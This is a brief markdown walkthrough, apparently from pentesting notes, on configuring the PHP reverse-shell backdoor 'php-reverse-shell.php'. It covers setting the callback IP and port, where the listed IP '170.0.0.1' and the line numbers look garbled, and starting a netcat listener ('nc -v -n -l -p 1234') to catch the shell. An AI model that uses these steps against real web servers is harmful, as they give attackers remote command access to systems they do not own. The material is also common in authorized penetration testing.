# Walk Through
- [x] **Modify the source**
- To prevent someone else from abusing your backdoor – a nightmare scenario while pentesting – you need to modify the source code to indicate where you want the reverse shell thrown back to.  Edit the following lines of php-reverse-shell.php:
______________
| Variable      | Default                | Personal?                       |
| ------------- |:----------------------:| -------------------------------:|
| $ip           | __170.0.0.1__          | Edit __line 7__                 |
| $port         | __1234__               | Edit __line 4__                 |
______________

- [x] **Get Ready to catch the reverse shell**
- Start a TCP listener on a host and port that will be accessible by the web server.  Use the same port here as you specified in the script (1234 in this example):

```
remember$ nc -v -n -l -p 1234
```
